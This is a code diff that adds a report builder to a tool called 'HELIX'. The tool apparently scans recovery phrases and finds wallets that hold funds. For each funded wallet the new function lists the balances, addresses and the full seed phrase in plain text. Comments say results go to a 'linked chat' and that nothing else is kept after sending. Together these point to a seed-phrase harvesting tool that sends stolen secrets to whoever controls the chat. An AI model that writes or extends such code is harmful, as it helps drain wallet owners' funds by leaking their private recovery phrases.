@@ -41,6 +41,41 @@ export function buildReport(all, funded) {
   return lines.join("\n");
 }
 
+/**
+ * The report that is delivered: funded wallets only, each with the coins it
+ * holds and the addresses those coins sit on. Everything else the scan touched
+ * stays out of it, because nothing else is kept once it has been sent.
+ */
+export function buildFundedReport(funded) {
+  const total = funded.reduce((sum, slot) => sum + slot.total, 0);
+  const lines = [
+    "HELIX — FUNDED WALLETS",
+    `With balance: ${funded.length}`,
+    `Balance found: ${formatUsd(total)}`,
+    `Generated: ${new Date().toISOString().replace("T", " ").slice(0, 16)} UTC`,
+    "",
+  ];
+
+  funded.forEach((slot, index) => {
+    lines.push(
+      `${index + 1}. ${formatUsd(slot.total)} · line ${slot.line}${
+        slot.account > 0 ? ` · account ${slot.account + 1}` : ""
+      } · ${slot.words}-word phrase`,
+    );
+    for (const item of slot.funded || []) {
+      lines.push(`   - ${item.symbol}: ${compactAmount(item.balance)} (${formatUsd(item.value)})`);
+    }
+    const chains = new Set((slot.funded || []).map((item) => item.chain));
+    for (const [chain, address] of Object.entries(slot.addresses || {})) {
+      if (chains.has(chain)) lines.push(`   ${chain}: ${Array.isArray(address) ? address.join(", ") : address}`);
+    }
+    lines.push(`   phrase: ${slot.phrase}`);
+    lines.push("");
+  });
+
+  return lines.join("\n");
+}
+
 /** One message for a single funded wallet, delivered to the linked chat as it lands. */
 export function buildWalletMessage(slot) {
   const lines = [
